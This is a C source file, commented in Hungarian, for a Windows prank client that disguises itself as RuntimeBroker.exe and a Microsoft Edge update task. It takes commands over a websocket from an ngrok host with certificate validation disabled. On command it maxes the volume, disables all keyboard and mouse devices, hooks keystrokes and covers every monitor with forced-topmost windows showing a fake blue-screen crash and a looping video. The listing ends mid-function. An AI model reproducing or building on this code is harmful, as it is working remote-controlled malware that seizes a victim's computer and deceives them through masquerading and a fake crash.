/*
 * dani-meglepi-client v4 — RuntimeBroker.exe
 *
 * ════════════════════════════════════════════════════════════════
 * Fordítás:
 *   x86_64-w64-mingw32-windres version.rc -O coff -o version.res
 *   x86_64-w64-mingw32-gcc -O2 -mwindows -DINITGUID \
 *     -o RuntimeBroker.exe dani-meglepi-client.c version.res \
 *     -lws2_32 -lwinhttp -lgdi32 -lole32 -lshell32 \
 *     -luuid -lshlwapi -luser32 -ladvapi32 -loleaut32 -ltaskschd \
 *     -lmfplat -lmfuuid -lmf -lmfreadwrite -lpropsys -levr \
 *     -lsetupapi -lcfgmgr32 -lmmdevapi
 * ════════════════════════════════════════════════════════════════
 */

#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE
#define WINVER       0x0A00
#define _WIN32_WINNT 0x0A00
#define COBJMACROS

#include <windows.h>
#include <winhttp.h>
#include <ole2.h>
#include <taskschd.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <objbase.h>
#include <propvarutil.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mferror.h>
#include <evr.h>
#include <setupapi.h>
#include <cfgmgr32.h>
#include <devguid.h>
#include <endpointvolume.h>
#include <mmdeviceapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Konfiguráció ───────────────────────────────────────────────────────── */
#define WS_HOST         L"turbulent-renter-liking.ngrok-free.app"
#define WS_PORT         443
#define WS_PATH_PREFIX  L"/ws/"
#define ASSET_DIR       L"C:\\Users\\Public\\dani-meglepi\\"
#define MP4_FILE        L"C:\\Users\\Public\\dani-meglepi\\daninak.mp4"
#define EXE_NAME        L"RuntimeBroker.exe"
#define TASK_NAME       L"MicrosoftEdgeUpdateTaskMachineCore"
#define RECONNECT_MS    3000
#define MAX_BACKOFF_MS  60000
#define HEARTBEAT_MS    20000
#define TOPMOST_MS      100
#define CLEARTXT_MS     2000
#define MAX_MONITORS    8
#define MAX_HID_DEVICES 64

/* ── BSOD felbontás táblázat ────────────────────────────────────────────── */
typedef struct { int w, h; const WCHAR *file; } BsodRes;
static const BsodRes BSOD_TABLE[] = {
    {  800,  600, L"C:\\Users\\Public\\dani-meglepi\\bsod_800x600.png"   },
    { 1024,  768, L"C:\\Users\\Public\\dani-meglepi\\bsod_1024x768.png"  },
    { 1152,  864, L"C:\\Users\\Public\\dani-meglepi\\bsod_1152x864.png"  },
    { 1280, 1024, L"C:\\Users\\Public\\dani-meglepi\\bsod_1280x1024.png" },
    { 1600, 1200, L"C:\\Users\\Public\\dani-meglepi\\bsod_1600x1200.png" },
};
#define BSOD_COUNT (sizeof(BSOD_TABLE)/sizeof(BSOD_TABLE[0]))

/* ── GDI+ flat C API ────────────────────────────────────────────────────── */
typedef int   GpStatus;
typedef void* GpImage;
typedef void* GpGraphics;
typedef struct {
    UINT32 GdiplusVersion;
    void  *DebugEventCallback;
    BOOL   SuppressBackgroundThread;
    BOOL   SuppressExternalCodecs;
} GpStartupInput;

typedef GpStatus (__stdcall *PFStartup)(ULONG_PTR*,const GpStartupInput*,void*);
typedef void     (__stdcall *PFShutdown)(ULONG_PTR);
typedef GpStatus (__stdcall *PFLoadStream)(IStream*,GpImage**);
typedef GpStatus (__stdcall *PFDrawRect)(GpGraphics*,GpImage*,INT,INT,INT,INT);
typedef GpStatus (__stdcall *PFFromHDC)(HDC,GpGraphics**);
typedef GpStatus (__stdcall *PFDelGraph)(GpGraphics*);
typedef GpStatus (__stdcall *PFDelImg)(GpImage*);
typedef GpStatus (__stdcall *PFClear)(GpGraphics*,DWORD);
typedef GpStatus (__stdcall *PFSetInterp)(GpGraphics*,INT);

static ULONG_PTR    gp_token=0;
static PFStartup    gp_Startup;
static PFShutdown   gp_Shutdown;
static PFLoadStream gp_LoadStream;
static PFDrawRect   gp_DrawRect;
static PFFromHDC    gp_FromHDC;
static PFDelGraph   gp_DelGraph;
static PFDelImg     gp_DelImg;
static PFClear      gp_Clear;
static PFSetInterp  gp_SetInterp;

static BOOL gdiplus_init(void) {
    HMODULE h=LoadLibraryW(L"gdiplus.dll");
    if (!h) return FALSE;
#define GL(v,t,n) v=(t)GetProcAddress(h,n); if(!v) return FALSE;
    GL(gp_Startup,    PFStartup,    "GdiplusStartup")
    GL(gp_Shutdown,   PFShutdown,   "GdiplusShutdown")
    GL(gp_LoadStream, PFLoadStream, "GdipCreateBitmapFromStream")
    GL(gp_DrawRect,   PFDrawRect,   "GdipDrawImageRectI")
    GL(gp_FromHDC,    PFFromHDC,    "GdipCreateFromHDC")
    GL(gp_DelGraph,   PFDelGraph,   "GdipDeleteGraphics")
    GL(gp_DelImg,     PFDelImg,     "GdipDisposeImage")
    GL(gp_Clear,      PFClear,      "GdipGraphicsClear")
    GL(gp_SetInterp,  PFSetInterp,  "GdipSetInterpolationMode")
#undef GL
    GpStartupInput si={1,NULL,FALSE,FALSE};
    return gp_Startup(&gp_token,&si,NULL)==0;
}

/* ── Per-monitor kontextus ──────────────────────────────────────────────── */
typedef struct {
    RECT    rect;           /* monitor pozíció + méret a virtuális asztalon */
    int     w, h;           /* monitor felbontása */
    HWND    overlay;        /* fullscreen overlay ablak */
    HWND    evr_wnd;        /* rejtett EVR ablak MP4-hez */
    HBITMAP bsod_bmp;       /* előre renderelt BSOD HBITMAP */
    IMFMediaSession *mf_session;
    IMFMediaSource  *mf_source;
    volatile BOOL    mp4_loop;
    HANDLE           mf_thread;
} MonitorCtx;

static MonitorCtx g_monitors[MAX_MONITORS];
static int        g_mon_count = 0;

/* ── Globális állapot ───────────────────────────────────────────────────── */
static HINSTANCE g_hInst   = NULL;
static HHOOK     g_kbhook  = NULL;
static BOOL      g_fs      = FALSE;

typedef enum { ST_IDLE, ST_SHOW, ST_DEMO } AppState;
typedef enum { SH_BLK1, SH_BSOD, SH_BLK2, SH_MP4 } ShowStep;

static volatile AppState g_state = ST_IDLE;
static volatile ShowStep g_step  = SH_BLK1;

/* Üzenethurok ablak (show/demo/clear PostMessage célja) */
static HWND g_msg_wnd = NULL;

/* Timerek */
static UINT_PTR g_show_timer    = 0;
static UINT_PTR g_cleartxt_timer = 0;
static UINT_PTR g_topmost_timer  = 0;

/* Hangerő */
static float g_saved_volume = 0.0f;
static BOOL  g_saved_mute   = FALSE;
static BOOL  g_volume_saved = FALSE;

/* HID */
static DEVINST g_disabled_devs[MAX_HID_DEVICES];
static int     g_disabled_count = 0;

/* WinHTTP */
static HINTERNET g_ws_session = NULL;
static HINTERNET g_connect    = NULL;
static HINTERNET g_ws         = NULL;
static volatile BOOL g_running = TRUE;

#define WM_DO_SHOW  (WM_USER+1)
#define WM_DO_DEMO  (WM_USER+2)
#define WM_DO_CLEAR (WM_USER+3)

/* ── Admin jog ──────────────────────────────────────────────────────────── */
static BOOL is_admin(void) {
    BOOL a=FALSE; HANDLE tok=NULL;
    if (!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&tok)) return FALSE;
    TOKEN_ELEVATION te={0}; DWORD sz=sizeof te;
    if (GetTokenInformation(tok,TokenElevation,&te,sizeof te,&sz)) a=te.TokenIsElevated;
    CloseHandle(tok); return a;
}

/* ── BSOD: legközelebbi felbontás ───────────────────────────────────────── */
static int bsod_best_idx(int sw, int sh) {
    int best=0; double best_d=1e18;
    for (int i=0;i<(int)BSOD_COUNT;i++) {
        double dw=BSOD_TABLE[i].w-sw, dh=BSOD_TABLE[i].h-sh;
        double d=dw*dw+dh*dh;
        if (d<best_d) { best_d=d; best=i; }
    }
    return best;
}

/* ── BSOD előrenderelés egy monitorhoz ─────────────────────────────────── */
static HBITMAP bsod_render_for(int w, int h) {
    const BsodRes *br=&BSOD_TABLE[bsod_best_idx(w,h)];
    IStream *s=NULL;
    if (FAILED(SHCreateStreamOnFileW(br->file,
            STGM_READ|STGM_SHARE_DENY_NONE,&s))) return NULL;
    GpImage *img=NULL;
    gp_LoadStream(s,&img);
    s->lpVtbl->Release(s);
    if (!img) return NULL;

    HDC scr=GetDC(NULL);
    HDC mdc=CreateCompatibleDC(scr);
    HBITMAP bmp=CreateCompatibleBitmap(scr,w,h);
    HBITMAP ob=(HBITMAP)SelectObject(mdc,bmp);

    GpGraphics *g=NULL;
    gp_FromHDC(mdc,&g);
    if (g) {
        gp_SetInterp(g,7); /* HighQualityBicubic */
        gp_Clear(g,0xFF000000);
        /* Bal felső (0,0) rögzített, teljes monitor méretére skálázva */
        gp_DrawRect(g,img,0,0,w,h);
        gp_DelGraph(g);
    }
    SelectObject(mdc,ob);
    DeleteDC(mdc);
    ReleaseDC(NULL,scr);
    gp_DelImg(img);
    return bmp;
}

/* ── Monitor felsorolás callback ────────────────────────────────────────── */
static BOOL CALLBACK monitor_enum_proc(HMONITOR hmon,HDC hdc,LPRECT rc,LPARAM lp) {
    (void)hdc;(void)lp;
    if (g_mon_count>=MAX_MONITORS) return TRUE;
    MonitorCtx *m=&g_monitors[g_mon_count];
    memset(m,0,sizeof *m);
    m->rect=*rc;
    m->w=rc->right-rc->left;
    m->h=rc->bottom-rc->top;
    g_mon_count++;
    return TRUE;
}

/* ── Overlay ablak eljárás ──────────────────────────────────────────────── */
static LRESULT CALLBACK overlay_wndproc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp);

/* ── EVR ablak eljárás ──────────────────────────────────────────────────── */
static LRESULT CALLBACK evr_wndproc(HWND h,UINT m,WPARAM w,LPARAM l) {
    return DefWindowProcW(h,m,w,l);
}

/* ── Monitorok inicializálása (ablakok + BSOD) ──────────────────────────── */
static void monitors_init(void) {
    g_mon_count=0;
    EnumDisplayMonitors(NULL,NULL,monitor_enum_proc,0);

    for (int i=0;i<g_mon_count;i++) {
        MonitorCtx *m=&g_monitors[i];

        /* Overlay ablak */
        m->overlay=CreateWindowExW(
            WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
            L"DM_Overlay",L"",WS_POPUP,
            m->rect.left,m->rect.top,1,1,
            NULL,NULL,g_hInst,NULL);

        /* EVR ablak */
        m->evr_wnd=CreateWindowExW(
            WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
            L"DM_EVRHost",L"",WS_POPUP,
            m->rect.left,m->rect.top,1,1,
            NULL,NULL,g_hInst,NULL);

        /* BSOD előrenderelés */
        m->bsod_bmp=bsod_render_for(m->w,m->h);
    }
}

/* ── Repaint minden overlay-en ─────────────────────────────────────────── */
static void repaint_all(void) {
    for (int i=0;i<g_mon_count;i++)
        if (g_monitors[i].overlay)
            InvalidateRect(g_monitors[i].overlay,NULL,FALSE);
}

/* ── WASAPI hangerő ─────────────────────────────────────────────────────── */
static IAudioEndpointVolume *get_audio_ep(void) {
    IMMDeviceEnumerator *en=NULL;
    IMMDevice *dev=NULL;
    IAudioEndpointVolume *vol=NULL;
    if (FAILED(CoCreateInstance(&CLSID_MMDeviceEnumerator,NULL,
            CLSCTX_ALL,&IID_IMMDeviceEnumerator,(void**)&en))) return NULL;
    if (SUCCEEDED(IMMDeviceEnumerator_GetDefaultAudioEndpoint(en,eRender,eConsole,&dev))) {
        IMMDevice_Activate(dev,&IID_IAudioEndpointVolume,CLSCTX_ALL,NULL,(void**)&vol);
        IMMDevice_Release(dev);
    }
    IMMDeviceEnumerator_Release(en);
    return vol;
}

static void volume_save_and_max(void) {
    IAudioEndpointVolume *vol=get_audio_ep();
    if (!vol) return;
    IAudioEndpointVolume_GetMasterVolumeLevelScalar(vol,&g_saved_volume);
    IAudioEndpointVolume_GetMute(vol,&g_saved_mute);
    IAudioEndpointVolume_SetMasterVolumeLevelScalar(vol,1.0f,NULL);
    IAudioEndpointVolume_SetMute(vol,FALSE,NULL);
    g_volume_saved=TRUE;
    IAudioEndpointVolume_Release(vol);
}

static void volume_restore(void) {
    if (!g_volume_saved) return;
    IAudioEndpointVolume *vol=get_audio_ep();
    if (!vol) return;
    IAudioEndpointVolume_SetMasterVolumeLevelScalar(vol,g_saved_volume,NULL);
    IAudioEndpointVolume_SetMute(vol,g_saved_mute,NULL);
    IAudioEndpointVolume_Release(vol);
    g_volume_saved=FALSE;
}

/* ── HID letiltás/engedélyezés ──────────────────────────────────────────── */
static void hid_disable_all(void) {
    if (!is_admin()) return;
    g_disabled_count=0;
    const GUID *cls[]={&GUID_DEVCLASS_KEYBOARD,&GUID_DEVCLASS_MOUSE};
    for (int c=0;c<2;c++) {
        HDEVINFO di=SetupDiGetClassDevsW(cls[c],NULL,NULL,DIGCF_PRESENT);
        if (di==INVALID_HANDLE_VALUE) continue;
        SP_DEVINFO_DATA dd; dd.cbSize=sizeof dd;
        for (DWORD i=0;SetupDiEnumDeviceInfo(di,i,&dd);i++) {
            if (g_disabled_count>=MAX_HID_DEVICES) break;
            if (CM_Disable_DevNode(dd.DevInst,0)==CR_SUCCESS)
                g_disabled_devs[g_disabled_count++]=dd.DevInst;
        }
        SetupDiDestroyDeviceInfoList(di);
    }
}

static void hid_enable_all(void) {
    for (int i=0;i<g_disabled_count;i++)
        CM_Enable_DevNode(g_disabled_devs[i],0);
    g_disabled_count=0;
}

/* ── Pendrive clear.txt poll ────────────────────────────────────────────── */
static VOID CALLBACK cleartxt_tick(HWND h,UINT m,UINT_PTR id,DWORD t) {
    (void)h;(void)m;(void)id;(void)t;
    if (g_state!=ST_SHOW) return;
    DWORD drives=GetLogicalDrives();
    for (int i=0;i<26;i++) {
        if (!(drives&(1<<i))) continue;
        WCHAR root[8]; swprintf_s(root,8,L"%c:\\",'A'+i);
        if (GetDriveTypeW(root)!=DRIVE_REMOVABLE) continue;
        WCHAR path[32]; swprintf_s(path,32,L"%c:\\clear.txt",'A'+i);
        if (GetFileAttributesW(path)!=INVALID_FILE_ATTRIBUTES) {
            PostMessageW(g_msg_wnd,WM_DO_CLEAR,0,0);
            return;
        }
    }
}

/* ── MF eseménykezelő szál (per-monitor) ───────────────────────────────── */
static DWORD WINAPI mf_event_thread(LPVOID p) {
    MonitorCtx *m=(MonitorCtx*)p;
    while (g_running&&m->mp4_loop) {
        if (!m->mf_session) { Sleep(50); continue; }
        IMFMediaEvent *ev=NULL;
        HRESULT hr=IMFMediaSession_GetEvent(m->mf_session,
            MF_EVENT_FLAG_NO_WAIT,&ev);
        if (hr==(HRESULT)MF_E_NO_EVENTS_AVAILABLE) { Sleep(20); continue; }
        if (FAILED(hr)) { Sleep(50); continue; }
        MediaEventType t=MEUnknown;
        IMFMediaEvent_GetType(ev,&t);
        IMFMediaEvent_Release(ev);
        if (t==MEEndOfPresentation&&m->mp4_loop) {
            PROPVARIANT pv; PropVariantInit(&pv);
            pv.vt=VT_I8; pv.hVal.QuadPart=0;
            IMFMediaSession_Start(m->mf_session,NULL,&pv);
            PropVariantClear(&pv);
        } else if (t==MESessionClosed) break;
    }
    return 0;
}

/* ── MP4 lejátszás egy monitoron ────────────────────────────────────────── */
static void mp4_play_on(MonitorCtx *m) {
    /* Source létrehozása */
    IMFSourceResolver *res=NULL;
    if (FAILED(MFCreateSourceResolver(&res))) return;
    MF_OBJECT_TYPE ot=MF_OBJECT_INVALID;
    IUnknown *src_unk=NULL;
    HRESULT hr=IMFSourceResolver_CreateObjectFromURL(res,
        MP4_FILE,MF_RESOLUTION_MEDIASOURCE,NULL,&ot,&src_unk);
    IMFSourceResolver_Release(res);
    if (FAILED(hr)) return;
    hr=IUnknown_QueryInterface(src_unk,&IID_IMFMediaSource,(void**)&m->mf_source);
    IUnknown_Release(src_unk);
    if (FAILED(hr)) return;

    hr=MFCreateMediaSession(NULL,&m->mf_session);
    if (FAILED(hr)) {
        IMFMediaSource_Release(m->mf_source); m->mf_source=NULL; return;
    }

    IMFTopology *topo=NULL; MFCreateTopology(&topo);
    IMFPresentationDescriptor *pd=NULL;
    IMFMediaSource_CreatePresentationDescriptor(m->mf_source,&pd);
    DWORD sdc=0;
    IMFPresentationDescriptor_GetStreamDescriptorCount(pd,&sdc);

    for (DWORD i=0;i<sdc;i++) {
        BOOL sel=FALSE; IMFStreamDescriptor *sd=NULL;
        IMFPresentationDescriptor_GetStreamDescriptorByIndex(pd,i,&sel,&sd);
        if (!sel||!sd) { if(sd) IMFStreamDescriptor_Release(sd); continue; }

        IMFMediaTypeHandler *mth=NULL;
        IMFStreamDescriptor_GetMediaTypeHandler(sd,&mth);
        GUID major; memset(&major,0,sizeof major);
        if (mth) {
            IMFMediaTypeHandler_GetMajorType(mth,&major);
            IMFMediaTypeHandler_Release(mth);
        }

        IMFTopologyNode *sn=NULL,*on=NULL;
        MFCreateTopologyNode(MF_TOPOLOGY_SOURCESTREAM_NODE,&sn);
        IMFTopologyNode_SetUnknown(sn,&MF_TOPONODE_SOURCE,(IUnknown*)m->mf_source);
        IMFTopologyNode_SetUnknown(sn,&MF_TOPONODE_PRESENTATION_DESCRIPTOR,(IUnknown*)pd);
        IMFTopologyNode_SetUnknown(sn,&MF_TOPONODE_STREAM_DESCRIPTOR,(IUnknown*)sd);
        MFCreateTopologyNode(MF_TOPOLOGY_OUTPUT_NODE,&on);

        BOOL node_ok=FALSE;
        if (IsEqualGUID(&major,&MFMediaType_Video)) {
            IMFActivate *evr=NULL;
            if (SUCCEEDED(MFCreateVideoRendererActivate(m->evr_wnd,&evr))&&evr) {
                IMFTopologyNode_SetObject(on,(IUnknown*)evr);
                IMFActivate_Release(evr);
                node_ok=TRUE;
            }
        } else if (IsEqualGUID(&major,&MFMediaType_Audio)) {
            /* Hang csak az első monitoron — a többi néma (nincs több audio endpoint) */
            if (m==&g_monitors[0]) {
                IMFActivate *sar=NULL;
                if (SUCCEEDED(MFCreateAudioRendererActivate(&sar))&&sar) {
                    IMFTopologyNode_SetObject(on,(IUnknown*)sar);
                    IMFActivate_Release(sar);
                    node_ok=TRUE;
                }
            }
        }

        if (node_ok&&sn&&on) {
            IMFTopology_AddNode(topo,sn);
            IMFTopology_AddNode(topo,on);
            IMFTopologyNode_ConnectOutput(sn,0,on,0);
        }
        if (sn) IMFTopologyNode_Release(sn);
        if (on) IMFTopologyNode_Release(on);
        IMFStreamDescriptor_Release(sd);
    }
    if (pd) IMFPresentationDescriptor_Release(pd);

    IMFMediaSession_SetTopology(m->mf_session,0,topo);
    if (topo) IMFTopology_Release(topo);

    PROPVARIANT pv; PropVariantInit(&pv); pv.vt=VT_EMPTY;
    IMFMediaSession_Start(m->mf_session,NULL,&pv);
    PropVariantClear(&pv);

    m->mp4_loop=TRUE;
    m->mf_thread=CreateThread(NULL,0,mf_event_thread,m,0,NULL);

    /* EVR ablak fullscreenre + pozíció */
    Sleep(200);
    SetWindowPos(m->evr_wnd,m->overlay,
        m->rect.left,m->rect.top,m->w,m->h,
        SWP_FRAMECHANGED|SWP_SHOWWINDOW|SWP_NOACTIVATE);

    IMFVideoDisplayControl *vdc=NULL;
    hr=MFGetService((IUnknown*)m->mf_session,
        &MR_VIDEO_RENDER_SERVICE,&IID_IMFVideoDisplayControl,(void**)&vdc);
    if (SUCCEEDED(hr)&&vdc) {
        RECT dest={0,0,m->w,m->h};
        IMFVideoDisplayControl_SetVideoPosition(vdc,NULL,&dest);
        IMFVideoDisplayControl_Release(vdc);
    }
    /* Overlay a legfelső */
    SetWindowPos(m->overlay,HWND_TOPMOST,0,0,0,0,
        SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE);
}

/* ── MP4 leállítás egy monitoron ────────────────────────────────────────── */
static void mp4_stop_on(MonitorCtx *m) {
    m->mp4_loop=FALSE;
    if (m->mf_session) {
        IMFMediaSession_Stop(m->mf_session);
        IMFMediaSession_Close(m->mf_session);
    }
    if (m->mf_thread) {
        WaitForSingleObject(m->mf_thread,2000);
        CloseHandle(m->mf_thread); m->mf_thread=NULL;
    }
    if (m->mf_source) {
        IMFMediaSource_Shutdown(m->mf_source);
        IMFMediaSource_Release(m->mf_source); m->mf_source=NULL;
    }
    if (m->mf_session) {
        IMFMediaSession_Release(m->mf_session); m->mf_session=NULL;
    }
    if (m->evr_wnd) ShowWindow(m->evr_wnd,SW_HIDE);
}

/* ── Show lépések ───────────────────────────────────────────────────────── */
static VOID CALLBACK show_tick(HWND h,UINT m,UINT_PTR id,DWORD t);

static void advance(ShowStep step) {
    g_step=step;
    if (g_show_timer) { KillTimer(g_msg_wnd,g_show_timer); g_show_timer=0; }
    repaint_all();
    switch (step) {
        case SH_BLK1: g_show_timer=SetTimer(g_msg_wnd,1,1000,show_tick); break;
        case SH_BSOD: g_show_timer=SetTimer(g_msg_wnd,1,3000,show_tick); break;
        case SH_BLK2: g_show_timer=SetTimer(g_msg_wnd,1, 500,show_tick); break;
        case SH_MP4:
            for (int i=0;i<g_mon_count;i++) mp4_play_on(&g_monitors[i]);
            break;
    }
}

static VOID CALLBACK show_tick(HWND h,UINT m,UINT_PTR id,DWORD t) {
    (void)h;(void)m;(void)id;(void)t;
    KillTimer(g_msg_wnd,g_show_timer); g_show_timer=0;
    switch (g_step) {
        case SH_BLK1: advance(SH_BSOD); break;
        case SH_BSOD: advance(SH_BLK2); break;
        case SH_BLK2: advance(SH_MP4);  break;
        case SH_MP4:                     break;
    }
}

/* ── Keyboard hook ──────────────────────────────────────────────────────── */
static LRESULT CALLBACK kbhook_proc(int code,WPARAM wp,LPARAM lp) {
    (void)wp;(void)lp;
    if (code==HC_ACTION&&g_fs) return 1;
    return CallNextHookEx(g_kbhook,code,wp,lp);
}

/* ── Fullscreen minden monitorra ────────────────────────────────────────── */
static void enter_fs_all(void) {
    if (g_fs) return;
    g_fs=TRUE;
    for (int i=0;i<g_mon_count;i++) {
        MonitorCtx *m=&g_monitors[i];
        SetWindowLongW(m->overlay,GWL_STYLE,WS_POPUP);
        SetWindowLongW(m->overlay,GWL_EXSTYLE,WS_EX_TOPMOST|WS_EX_TOOLWINDOW);
        SetWindowPos(m->overlay,HWND_TOPMOST,
            m->rect.left,m->rect.top,m->w,m->h,
            SWP_FRAMECHANGED|SWP_SHOWWINDOW|SWP_NOACTIVATE);
    }
    if (g_kbhook) UnhookWindowsHookEx(g_kbhook);
    g_kbhook=SetWindowsHookExW(WH_KEYBOARD_LL,kbhook_proc,NULL,0);
}

/* ── Fullscreen bezárása minden monitoron ───────────────────────────────── */
static void leave_fs_all(void) {
    if (!g_fs) return;
    g_fs=FALSE;
    for (int i=0;i<g_mon_count;i++) {
        mp4_stop_on(&g_monitors[i]);
        ShowWindow(g_monitors[i].overlay,SW_HIDE);
    }
    if (g_kbhook) { UnhookWindowsHookEx(g_kbhook); g_kbhook=NULL; }
}

/* ── do_show ────────────────────────────────────────────────────────────── */
static void do_show(void) {
    g_state=ST_SHOW;
    volume_save_and_max();
    hid_disable_all();
    enter_fs_all();
    g_cleartxt_timer=SetTimer(g_msg_wnd,3,CLEARTXT_MS,cleartxt_tick);
    advance(SH_BLK1);
}

/* ── do_demo ────────────────────────────────────────────────────────────── */
static void do_demo(void) {
    g_state=ST_DEMO;
    enter_fs_all();
    repaint_all();
}

/* ── do_clear ───────────────────────────────────────────────────────────── */
static void do_clear(void) {
    g_state=ST_IDLE;
    if (g_cleartxt_timer) { KillTimer(g_msg_wnd,g_cleartxt_timer); g_cleartxt_timer=0; }
    if (g_show_timer)     { KillTimer(g_msg_wnd,g_show_timer);     g_show_timer=0; }
    leave_fs_all();
    hid_enable_all();
    volume_restore();
}

/* ── Overlay WM_PAINT ───────────────────────────────────────────────────── */
static void overlay_paint(HWND hwnd) {
    /* Melyik monitor? */
    MonitorCtx *m=NULL;
    for (int i=0;i<g_mon_count;i++)
        if (g_monitors[i].overlay==hwnd) { m=&g_monitors[i]; break; }
    if (!m) return;

    PAINTSTRUCT ps;
    HDC hdc=BeginPaint(hwnd,&ps);

    HDC mdc=CreateCompatibleDC(hdc);
    HBITMAP bm=CreateCompatibleBitmap(hdc,m->w,m->h);
    HBITMAP ob=(HBITMAP)SelectObject(mdc,bm);

    RECT rc={0,0,m->w,m->h};
    HBRUSH blk=CreateSolidBrush(RGB(0,0,0));
    FillRect(mdc,&rc,blk); DeleteObject(blk);

    if (g_state==ST_DEMO) {
        HBRUSH rb=CreateSolidBrush(RGB(200,0,0));
        FillRect(mdc,&rc,rb); DeleteObject(rb);
        int fs=m->h/3;
        HFONT fn=CreateFontW(fs,0,0,0,FW_BLACK,0,0,0,
            DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY,DEFAULT_PITCH|FF_SWISS,L"Arial");
        HFONT of=(HFONT)SelectObject(mdc,fn);
        SetTextColor(mdc,RGB(255,255,255));
        SetBkMode(mdc,TRANSPARENT);
        DrawTextW(mdc,L"DEMO",-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);
        SelectObject(mdc,of); DeleteObject(fn);

    } else if (g_state==ST_SHOW) {
        switch (g_step) {
            case SH_BLK1: case SH_BLK2: break; /* fekete */
            case SH_BSOD:
                if (m->bsod_bmp) {
                    HDC bdc=CreateCompatibleDC(mdc);
                    HBITMAP ob2=(HBITMAP)SelectObject(bdc,m->bsod_bmp);
                    BitBlt(mdc,0,0,m->w,m->h,bdc,0,0,SRCCOPY);
                    SelectObject(bdc,ob2); DeleteDC(bdc);
                } else {
                    HBRUSH bb=CreateSolidBrush(RGB(0,120,215));
                    FillRect(mdc,&rc,bb); DeleteObject(bb);
                }
                break;
            case SH_MP4: break; /* EVR renderel az evr_wnd-re */
        }
    }

    BitBlt(hdc,0,0,m->w,m->h,mdc,0,0,SRCCOPY);
    SelectObject(mdc,ob); DeleteObject(bm); DeleteDC(mdc);
    EndPaint(hwnd,&ps);
}

/* ── Overlay ablak eljárás ──────────────────────────────────────────────── */
static LRESULT CALLBACK overlay_wndproc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp) {
    switch (msg) {
        case WM_PAINT:      overlay_paint(hwnd); return 0;
        case WM_ERASEBKGND: return 1;
        case WM_WINDOWPOSCHANGING:
            if (g_fs) {
                WINDOWPOS *p=(WINDOWPOS*)lp;
                p->hwndInsertAfter=HWND_TOPMOST;
                p->flags&=~SWP_NOZORDER;
            }
            return 0;
        case WM_CLOSE: case WM_DESTROY: return 0;
        default: return DefWindowProcW(hwnd,msg,wp,lp);
    }
}

/* ── Üzenet ablak eljárás (show/demo/clear + timerek) ───────────────────── */
static LRESULT CALLBACK msg_wndproc(HWND hwnd,UINT msg,WPARAM wp,LPARAM lp) {
    switch (msg) {
        case WM_DO_SHOW:  do_show();  return 0;
        case WM_DO_DEMO:  do_demo();  return 0;
        case WM_DO_CLEAR: do_clear(); return 0;
        case WM_TIMER:
            /* Timer 99: topmost kényszer minden overlay ablakra */
            if (wp==99&&g_fs) {
                for (int i=0;i<g_mon_count;i++) {
                    MonitorCtx *m=&g_monitors[i];
                    SetWindowPos(m->overlay,HWND_TOPMOST,0,0,0,0,
                        SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE);
                }
            }
            return 0;
        case WM_CLOSE: case WM_DESTROY:
            PostQuitMessage(0); return 0;
        default: return DefWindowProcW(hwnd,msg,wp,lp);
    }
}

/* ── Parancs feldolgozás ────────────────────────────────────────────────── */
static void process_cmd(const char *json) {
    const char *p=strstr(json,"\"cmd\""); if (!p) return;
    p=strchr(p,':');                      if (!p) return;
    while (*p==':'||*p==' '||*p=='"') p++;
    if      (strncmp(p,"show", 4)==0) PostMessageW(g_msg_wnd,WM_DO_SHOW, 0,0);
    else if (strncmp(p,"demo", 4)==0) PostMessageW(g_msg_wnd,WM_DO_DEMO, 0,0);
    else if (strncmp(p,"clear",5)==0) PostMessageW(g_msg_wnd,WM_DO_CLEAR,0,0);
}

/* ── WS cleanup ─────────────────────────────────────────────────────────── */
static void ws_cleanup(void) {
    if (g_ws)      { WinHttpCloseHandle(g_ws);      g_ws     =NULL; }
    if (g_connect) { WinHttpCloseHandle(g_connect); g_connect=NULL; }
}

/* ── WS kapcsolat ───────────────────────────────────────────────────────── */
static BOOL ws_open(void) {
    DWORD vol=0;
    GetVolumeInformationW(L"C:\\",NULL,0,&vol,NULL,NULL,NULL,0);
    WCHAR cid[32],wspath[128];
    swprintf_s(cid,32,L"pc-%08X",vol);
    swprintf_s(wspath,128,L"%s%s",WS_PATH_PREFIX,cid);

    g_connect=WinHttpConnect(g_ws_session,WS_HOST,WS_PORT,0);
    if (!g_connect) return FALSE;

    HINTERNET req=WinHttpOpenRequest(g_connect,L"GET",wspath,NULL,
        WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
    if (!req) { ws_cleanup(); return FALSE; }

    DWORD fl=SECURITY_FLAG_IGNORE_UNKNOWN_CA
            |SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
            |SECURITY_FLAG_IGNORE_CERT_CN_INVALID
            |SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(req,WINHTTP_OPTION_SECURITY_FLAGS,&fl,sizeof fl);
    WinHttpAddRequestHeaders(req,
        L"ngrok-skip-browser-warning: true\r\n",-1L,WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpSetOption(req,WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,NULL,0);
    if (!WinHttpSendRequest(req,WINHTTP_NO_ADDITIONAL_HEADERS,0,
                            WINHTTP_NO_REQUEST_DATA,0,0,0)
     || !WinHttpReceiveResponse(req,NULL)) {
        WinHttpCloseHandle(req); ws_cleanup(); return FALSE;
    }
    g_ws=WinHttpWebSocketCompleteUpgrade(req,0);
    WinHttpCloseHandle(req);
    if (!g_ws) { ws_cleanup(); return FALSE; }
    return TRUE;
}

/* ── Heartbeat szál ─────────────────────────────────────────────────────── */
static DWORD WINAPI hb_thread(LPVOID p) {
    (void)p;
    const char *ping="{\"ping\":true}";
    while (g_running) {
        Sleep(HEARTBEAT_MS);
        if (g_ws)
            WinHttpWebSocketSend(g_ws,
